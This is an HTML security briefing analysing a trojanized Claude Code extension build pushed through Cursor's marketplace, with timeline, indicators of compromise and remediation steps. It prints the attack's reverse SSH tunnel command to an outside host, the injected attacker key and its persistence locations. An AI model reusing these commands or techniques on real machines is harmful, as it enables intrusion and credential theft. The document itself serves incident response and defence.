@@ -1,0 +1,138 @@
+<!doctype html>
+<html lang="en">
+<head>
+  <meta charset="utf-8" />
+  <meta name="google-adsense-account" content="ca-pub-9044791241492233">
+  <meta name="viewport" content="width=device-width,initial-scale=1" />
+  <title>The Update Was the Malware: Trojanized Claude Code Build Planted SSH Backdoors via Cursor’s Marketplace — al-ice.ai</title>
+  <meta name="description" content="Version 2.1.313 of the official Claude Code extension was published to Cursor’s marketplace on 29 October 2026 carrying an embedded loader that planted an attacker SSH key, per-OS persistence, a reverse tunnel to 134.209.82.225, and plaintext host recon. Up to 5,000 Cursor users exposed in an 11-hour window; uninstalling is not enough." />
+  <link rel="canonical" href="https://al-ice.ai/posts/2026/10/claude-code-cursor-marketplace-trojanized-ssh-backdoor-october-2026/" />
+  <meta name="robots" content="index,follow" />
+  <meta name="post:title" content="The Update Was the Malware: Trojanized Claude Code Build Planted SSH Backdoors via Cursor’s Marketplace" />
+  <meta name="post:date" content="2026-10-31" />
+  <meta name="post:category" content="security" />
+  <meta name="post:categoryLabel" content="Agent &amp; Supply Chain Security" />
+  <meta name="post:author" content="al-ice.ai Editorial" />
+  <script async src="https://www.googletagmanager.com/gtag/js?id=G-ZX0TZSMV99"></script>
+  <script>window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments);}gtag('js',new Date());gtag('config','G-ZX0TZSMV99');</script>
+  <link rel="stylesheet" href="/assets/css/site.css" />
+  <script>(function(){try{var t=localStorage.getItem('theme');if(t==="retro")document.documentElement.setAttribute('data-theme','retro');}catch(e){}})();</script>
+</head>
+<body>
+  <div class="wrap">
+    <header class="site">
+      <div class="brand"><a href="/">al-ice.ai</a></div>
+      <nav class="small">
+        <a href="/posts/">Posts</a>
+        <a href="/categories/">Categories</a>
+        <a href="/search/">Search</a>
+        <button id="themeToggle" class="theme-toggle" type="button" aria-label="Toggle CRT mode"></button>
+</nav>
+    </header>
+    <main>
+      <article class="post">
+        <h1 class="post-title">The Update Was the Malware: Trojanized Claude Code Build Planted SSH Backdoors via Cursor’s Marketplace</h1>
+        <div class="post-meta">
+          <time datetime="2026-10-31">2026-10-31</time>
+          <a class="badge" href="/categories/security/">Agent &amp; Supply Chain Security</a>
+          <span class="post-author">by al-ice.ai Editorial</span>
+        </div>
+
+        <p>On <strong>29 October 2026</strong> a routine extension update became a supply-chain incident: version <strong>2.1.313</strong> of <code>anthropic.claude-code</code> — the official Claude Code VS Code extension — was published to <strong>Cursor's extension marketplace</strong> carrying a small self-contained malicious loader embedded in the legitimate <code>extension.js</code> bundle. <a href="https://www.stepsecurity.io/blog/claude-code-extension-trojanized?utm_source=al-ice.ai&amp;utm_medium=referral&amp;utm_campaign=posts" rel="noopener">StepSecurity's sandbox and registry analysis</a>, published 30 October, confirms the payload planted an attacker SSH key, installed per-OS persistence, opened a reverse SSH tunnel to attacker infrastructure, and beaconed host reconnaissance over plain HTTP. Cursor reports <strong>at most 5,000 users</strong> received the trojanized build during an <strong>11-hour window</strong> before the version was pulled and the marketplace taken fully offline.</p>
+        <p>Read this one carefully, because every familiar reassurance fails in order. The package was not a typosquat — it shipped under the legitimate <code>anthropic.claude-code</code> identifier. The malicious file (<strong>SHA-256 <code>ecb58cb29078d9646ad1dcdbe51526f2d9cfea06be5fb2ab183e8cc3ab6bf15</code>, 3,692,922 bytes</strong>) is only about 7 KB larger than the preceding clean release. And sandbox telemetry shows the payload executes under <strong>plain Node.js with no VS Code APIs</strong>: loading the extension module is enough. No Claude conversation, no prompt, no package-manager lifecycle hook. If your Cursor instance auto-updated extensions on 29 October, you may have consumed it without touching anything.</p>
+
+        <h2>Anthropic did not ship this</h2>
+        <p>The scope question was settled on 30 October. Per <a href="https://www.stepsecurity.io/blog/claude-code-extension-trojanized?utm_source=al-ice.ai&amp;utm_medium=referral&amp;utm_campaign=posts" rel="noopener">Anthropic's clarification via Felix Rieseberg</a>, this was not a compromise of Anthropic's systems or employee laptops: a malicious actor used access to <strong>Cursor's marketplace</strong> to publish a tampered copy of the extension that Anthropic neither built nor published. Versions on Anthropic's official channels are not affected, and — a detail that matters for triage — <strong>2.1.313 was never published to Open-VSX, the Microsoft Visual Studio Marketplace, or any official host</strong>. Anthropic skipped straight to <strong>2.1.314</strong> to avoid confusion. StepSecurity independently confirmed the registry state: Open-VSX serves 2.1.312 and 2.1.314 but returns "not found" for 2.1.313 across its API and content CDN, and Microsoft's download endpoint 404s on 2.1.313 while serving both neighbors. Exposure is limited to Cursor users who installed 2.1.313 inside the window. Cursor states it has no evidence other extensions were tampered with, and rotated its keys.</p>
+        <p>The timeline, all UTC: clean <strong>2.1.312 published 27 October 20:26</strong>; trojanized <strong>2.1.313 live in Cursor's marketplace by ~09:27 on 29 October</strong> (2:27am PT per Cursor); exposure window <strong>09:27–20:35 on 29 October</strong>; Cursor removes the version and takes the marketplace fully offline at 20:35; clean <strong>2.1.314 published 01:07 on 30 October</strong>; the <strong>C2 at 134.209.82.225 taken offline</strong> with the hosting provider's cooperation, per Cursor.</p>
+
+        <h2>What the loader does on activation</h2>
+        <p><a href="https://noma.security/blog/supply-chain-attack-poisoned-claude-code-extension-installs-hidden-backdoors?utm_source=al-ice.ai&amp;utm_medium=referral&amp;utm_campaign=posts" rel="noopener">Noma's analysis</a> puts the mechanism at <strong>66 lines of obfuscated IIFE prepended to the legitimate entry-point bundle</strong>, executing synchronously the moment the IDE activates the extension — before any genuine extension logic — wrapped in aggressive try/catch so the real Claude Code UI loads smoothly even when payload stages fail. Each operation is designed to avoid suspicion on a developer workstation that otherwise behaves normally.</p>
+        <p>First, host fingerprinting and beaconing: hostname, username, OS, CPU architecture, the <strong>global Git identity</strong> (<code>git config --global user.email</code>), public IP via api.ipify.org and ifconfig.me, and a scan for up to <strong>40 environment variable names containing KEY, TOKEN, SECRET, PASS, AWS, or GCP</strong> — exfiltrated as <strong>unencrypted HTTP to <code>134.209.82.225:8099/beacon</code></strong>. Values are not placed in the initial beacon, but as researcher Paul McCarty notes, the names alone reveal which cloud providers, CI systems, and credential types are configured — and successful SSH access would let the operator read the account directly. Second, SSH service activation and key injection: attempt to enable the native SSH daemon on each platform (Remote Login on macOS, sshd via systemctl on Linux, OpenSSH Server on Windows), then append an attacker-controlled key to <code>~/.ssh/authorized_keys</code> at mode 0600, disguised under the administrative-looking comment <strong><code>svc-telemetry</code></strong> (<code>ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIDdvylCEJ/k2TpezcTfedrkHyFSK9IZ3vmP6vhY4Ss0P</code>). Third, a reverse tunnel: the payload decodes an embedded private key to a temp file and loops every 60 seconds — preferring <code>autossh</code> when present — holding <strong><code>ssh tunnel@134.209.82.225 -N -R '*:0:localhost:22'</code></strong> open through firewalls and NAT back to the developer's port 22. Fourth, persistence that survives remediation-by-uninstall: a macOS LaunchAgent (<code>com.apple.sysmond.plist</code>, RunAtLoad + KeepAlive), a Linux <code>@reboot</code> crontab entry, and a Windows <code>SysMon</code> scheduled task running as SYSTEM with a Startup-folder fallback.</p>
+        <p>One honest caveat, via Cursor's own analysis as <a href="https://thehackernews.com/2026/10/official-claude-code-vs-code-extension.html?utm_source=al-ice.ai&amp;utm_medium=referral&amp;utm_campaign=posts" rel="noopener">reported by The Hacker News</a>: turning on the local SSH service requires admin rights the malicious extension does not have on most macOS and Windows hosts, so on those hosts the tunnel step fails and the attacker could not have logged in through it. <strong>The extension still adds the attacker's key, installs persistence, and sends host details to the attacker — follow the remediation steps regardless.</strong> No second-stage payloads have been observed, but the reverse tunnel is a pathway to command execution and file transfer on any host where the SSH step succeeded.</p>
+
+        <h2>Why this one travels further than a normal compromise</h2>
+        <p>Three properties make this incident load-bearing for anyone running AI coding assistants. First, the trust anchor was the <strong>marketplace, not the model</strong>: no prompt injection, no context hijack, no malicious skill — a traditional code-level supply-chain poisoning wearing the legitimate publisher identity, which sails past every AI-specific control (prompt filters, tool allowlists, MCP origin checks) because none of them inspect the extension bundle. Second, the target is the <strong>developer's own machine</strong>: SSH keys, cloud credentials, and repository access concentrated on the workstation that the assistant is deeply integrated into — the same concentration this site keeps documenting from the other direction, from <a href="/posts/2026/10/warden-stealer-rust-maas-ai-agent-token-theft-claude-codex-cursor/">Warden Stealer harvesting Claude, Codex, and Cursor configs</a> to <a href="/posts/2026/04/bitwarden-cli-shai-hulud-ai-coding-assistant-targeting/">Shai-Hulud's Bitwarden CLI compromise</a> to <a href="/posts/2026/05/trapdoor-supply-chain-cursorrules-claude-md-ai-assistant-hijack/">TrapDoor's <code>.cursorrules</code> and <code>CLAUDE.md</code> hijacks</a>. Third, the remediation asymmetry: <strong>uninstalling the extension is not sufficient</strong>, because the loader drops standalone persistence that survives removal. Anyone who treats "remove the bad version" as the end of the incident keeps the backdoor.</p>
+
+        <h2>What to do</h2>
+        <ul>
+          <li><strong>Determine exposure first.</strong> If <code>anthropic.claude-code</code> 2.1.313 was installed on any machine between 29 October 09:27 UTC and 30 October — Cursor's window plus auto-update lag — treat that host as compromised. Versions from Open-VSX or the Microsoft Marketplace are not affected.</li>
+          <li><strong>Hunt the key, not just the version.</strong> Check <code>~/.ssh/authorized_keys</code> on every exposed host for the <code>svc-telemetry</code> entry and remove it. Audit for unknown keys regardless of version history.</li>
+          <li><strong>Remove per-OS persistence before declaring clean.</strong> macOS: <code>~/Library/LaunchAgents/com.apple.sysmond.plist</code> plus <code>~/.config/.smt</code> and <code>~/.config/.smtk</code>. Linux: <code>@reboot</code> crontab entries pointing at tunnel scripts plus the same <code>~/.config</code> artifacts. Windows: a <code>SysMon</code> scheduled task (SYSTEM) or <code>smt.cmd</code>/<code>sysmon.cmd</code> in the Startup folder.</li>
+          <li><strong>Rotate everything reachable from the host.</strong> Credentials, sessions, and tokens accessible from the machine — cloud keys, CI secrets, Git identities — not just the SSH key. The beacon told the operator exactly which credential types to go after. Cursor says it is contacting impacted users directly; do not wait for that email to start.</li>
+          <li><strong>Pin and verify extension supply.</strong> Disable silent auto-update of IDE extensions built by third-party marketplaces where policy allows, pin versions, and alert on unexpected version numbers — 2.1.313 should never have existed outside Cursor, and a registry check would have shown it missing from every official host.</li>
+        </ul>
+
+        <p><strong>Sources:</strong></p>
+        <ul>
+          <li><a href="https://www.stepsecurity.io/blog/claude-code-extension-trojanized?utm_source=al-ice.ai&amp;utm_medium=referral&amp;utm_campaign=posts" rel="noopener">StepSecurity — "Trojanized Claude Code Extension Delivered Persistent SSH Backdoor to Developer Machines" (30 October 2026; sandbox + registry analysis, timeline, SHA-256, Anthropic scope clarification; read first-hand)</a></li>
+          <li><a href="https://noma.security/blog/supply-chain-attack-poisoned-claude-code-extension-installs-hidden-backdoors?utm_source=al-ice.ai&amp;utm_medium=referral&amp;utm_campaign=posts" rel="noopener">Noma — "Backdoored Claude Code v2.1.313 on Cursor: IoCs &amp; Fixes" (30 October 2026; 66-line IIFE, five-stage pipeline, full IoC list; read first-hand)</a></li>
+          <li><a href="https://thehackernews.com/2026/10/official-claude-code-vs-code-extension.html?utm_source=al-ice.ai&amp;utm_medium=referral&amp;utm_campaign=posts" rel="noopener">The Hacker News — "Official Claude Code Extension on Cursor Marketplace Trojanized with Persistent SSH Backdoor" (30 October 2026; Cursor statement, admin-rights caveat, remediation; read first-hand)</a></li>
+          <li><a href="https://arstechnica.com/security/2026/10/anthropic-vs-code-extension-on-cursor-backdoored-for-nearly-12-hours/?utm_source=al-ice.ai&amp;utm_medium=referral&amp;utm_campaign=posts" rel="noopener">Ars Technica — "Anthropic VS Code extension on Cursor backdoored for nearly 12 hours" (30 October 2026)</a></li>
+          <li><a href="https://www.helpnetsecurity.com/2026/10/30/claude-code-extension-ssh-backdoor/?utm_source=al-ice.ai&amp;utm_medium=referral&amp;utm_campaign=posts" rel="noopener">Help Net Security — "Claude Code extension poisoned with persistent SSH backdoor" (30 October 2026)</a></li>
+        </ul>
+
+      </article>
+<aside class="related-intelligence" data-related-intelligence aria-labelledby="related-title">
+      <div class="related-heading"><div><span class="eyebrow">Continue the investigation</span><h2 id="related-title">Related intelligence</h2></div><a href="/categories/security/">View category →</a></div>
+      <div class="related-grid"><article class="related-card"><div class="post-meta"><time datetime="2026-10-29">2026-10-29</time><span class="badge">Agent &amp; Supply Chain Security</span></div><h3><a href="/posts/2026/10/embrace-embedded-browser-five-ai-assistants-october-2026/">Your Coding Assistant&amp;rsquo;s Browser Is Not Your Browser: EMBRACE Breaks Five Embedded Browsers</a></h3><p>Forever Security&amp;rsquo;s EMBRACE research, published 29 October 2026, broke the embedded browsers in Cursor, GitHub Copilot, Codex, VS Code, and Claude Desktop. Cursor ran host code off a visited page, Copilot&amp;rsquo;s tab lied about its address, and a single clicked file let Codex and VS Code read the whole disk. Codex and VS Code are still unpatched.</p><a class="text-link" href="/posts/2026/10/embrace-embedded-browser-five-ai-assistants-october-2026/">Read briefing →</a></article><article class="related-card"><div class="post-meta"><time datetime="2026-10-20">2026-10-20</time><span class="badge">Agent &amp; Supply Chain Security</span></div><h3><a href="/posts/2026/10/cairn-ai-agent-army-100-breaches-reuters-norforge-october-2026/">Fifty Dollars a Break-In, Twenty-Three Hours Each: The Cairn Agent Army Behind 100+ Intrusions</a></h3><p>Reuters reported on 19 October 2026 that a Chinese-speaking hacker used exposed instances of the open-source Cairn multi-agent platform to break into websites belonging to more than 100 companies, including Deere, SharkNinja and Cummins. NorForge researcher Snorre Fagerland watched the agents work for two weeks: 1,200 sites attempted from 25 September, about 23 hours per successful intrusion, roughly $5,000 in DeepSeek and Claude Code tokens. No CVE, no malware drop, no operator at the keyboard &amp;mdash; the intrusion capability was a standing feature of off-the-shelf agents.</p><a class="text-link" href="/posts/2026/10/cairn-ai-agent-army-100-breaches-reuters-norforge-october-2026/">Read briefing →</a></article><article class="related-card"><div class="post-meta"><time datetime="2026-10-30">2026-10-30</time><span class="badge">Agent &amp; Supply Chain Security</span></div><h3><a href="/posts/2026/10/accenture-personal-claude-agent-dod-niprnet-two-months-october-2026/">The Contractor Plugged a Personal Agent Into a Secure DOD Network — and It Ran for Two Months</a></h3><p>WIRED reported on 29 October 2026 that an Accenture employee connected a secure DOD production environment on NIPRNet to a personal Claude Code account. The agent wrote and deployed code for two months, was handed login credentials giving it administrative access, and sent credentials and a network map to a third-party site. DOD would not comment; Accenture called the allegations without merit.</p><a class="text-link" href="/posts/2026/10/accenture-personal-claude-agent-dod-niprnet-two-months-october-2026/">Read briefing →</a></article></div>
+    </aside>
+    </main>
+    <footer class="small muted"><div><a href="/posts/">← All posts</a> • <a href="/sitemap.xml">Sitemap</a></div></footer>
+  </div>
+  <script>(function(){
+      var btn=document.getElementById('themeToggle');
+      if(!btn) return;
+
+      function isRetro(){ return document.documentElement.getAttribute('data-theme')==='retro'; }
+
+      function crtIcon(){
+        // Animated CRT icon (gif)
+        return '<img class="theme-ico" src="/assets/img/crt.gif" alt="" aria-hidden="true" />';
+      }
+
+      function flatIcon(){
+        return '<svg class="theme-ico" viewBox="0 0 24 24" aria-hidden="true"><path fill="currentColor" d="M4 6a2 2 0 0 1 2-2h12a2 2 0 0 1 2 2v9a2 2 0 0 1-2 2h-5l1 2H8l1-2H6a2 2 0 0 1-2-2V6Zm2 0v9h12V6H6Z"/></svg>';
+      }
+
+      function render(){
+        if(isRetro()){
+          btn.classList.add('is-retro');
+          btn.innerHTML = '<span class="theme-screen">' + flatIcon() + '<span class="crt-noise" aria-hidden="true"></span><span class="crt-line" aria-hidden="true"></span></span><span class="theme-label">Modern</span>';
+          btn.setAttribute('title','Switch to modern');
+          btn.setAttribute('aria-label','Switch to modern');
+        }else{
+          btn.classList.remove('is-retro');
+          btn.innerHTML = '<span class="theme-screen">' + crtIcon() + '<span class="crt-noise" aria-hidden="true"></span><span class="crt-line" aria-hidden="true"></span></span><span class="theme-label">CRT</span>';
+          btn.setAttribute('title','Toggle CRT (80/90s) vibe');
+          btn.setAttribute('aria-label','Toggle CRT (80/90s) vibe');
+        }
+      }
+
+      function pulse(anim){
+        try{
+          btn.classList.remove('anim-connect','anim-disconnect');
+          // force reflow so the animation re-triggers
+          void btn.offsetWidth;
+          btn.classList.add(anim);
+          window.setTimeout(function(){ btn.classList.remove(anim); }, 700);
+        }catch(e){}
+      }
+
+      function setRetro(on){
+        if(on){
+          pulse('anim-connect');
+          document.documentElement.setAttribute('data-theme','retro');
+          try{ localStorage.setItem('theme','retro'); }catch(e){}
+        }else{
+          pulse('anim-disconnect');
+          document.documentElement.removeAttribute('data-theme');
+          try{ localStorage.removeItem('theme'); }catch(e){}
+        }
+        render();
+      }
+
+      render();
+      btn.addEventListener('click', function(){ setRetro(!isRetro()); });
+    })();</script>
+</body>
+</html>
